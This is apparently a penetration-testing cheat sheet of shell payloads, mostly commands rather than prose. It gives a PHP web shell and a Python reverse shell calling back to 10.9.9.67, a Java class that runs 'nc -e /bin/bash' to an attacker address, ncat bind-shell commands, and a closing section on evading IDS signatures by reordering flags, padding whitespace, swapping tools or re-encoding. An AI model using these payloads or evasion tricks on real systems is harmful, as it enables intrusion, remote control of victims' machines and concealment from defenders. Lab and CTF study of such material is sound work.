`>> python3 -c "import pty; pty.spawn('/bin/bash')"`  
`>> export TERM=xterm`

<?php exec("bash -i>/dev/tcp/10.9.9.67/1234 0>&1");?>

http://10.9.9.67/shell_rev.php

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.9.67",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

exploit.java
```shell-session
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

javac Exploit.java
```

## Blind Shell

victim_PC:`ncat -lvnp 1234 -e /bin/bash`

Attacker_Pc:  `ncat IP_Victim 1234`

### Modify the data

Consider the simple case where you want to use Ncat to create a bind shell. The following command `ncat -lvnp 1234 -e /bin/bash` tells `ncat` to listen on TCP port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.

-   Scanning for `ncat -lvnp` can be easily evaded by changing the order of the flags.
-   On the other hand, inspecting the payload for `ncat -` can be evaded by adding an extra white space, such as `ncat  -` which would still run correctly on the target system.
-   If the IDS is looking for `ncat`, then simple changes to the original command won’t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as `nc` or `socat`. Alternatively, you can consider a different encoding if the target system can process it properly.